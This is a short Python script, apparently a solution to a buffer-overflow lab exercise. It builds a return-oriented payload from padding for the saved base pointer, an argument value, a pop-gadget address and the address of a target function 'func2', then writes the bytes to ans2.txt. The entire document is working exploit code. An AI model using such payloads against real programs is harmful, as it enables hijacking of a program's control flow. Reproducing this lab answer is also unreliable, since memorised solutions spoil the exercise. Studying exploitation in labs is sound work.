x = b'\xf8\x03\x00\x00\x00\x00\x00\x00'
rbp = b"A" * 8
pop_address = b'\xbb\x12\x40\x00\x00\x00\x00\x00'
func2_address = b'\x16\x12\x40\x00\x00\x00\x00\x00' # 小端地址
payload = rbp +x+ pop_address+func2_address
# Write the payload to a file
with open("ans2.txt", "wb") as f:
 f.write(payload)
print("Payload written to ans2.txt")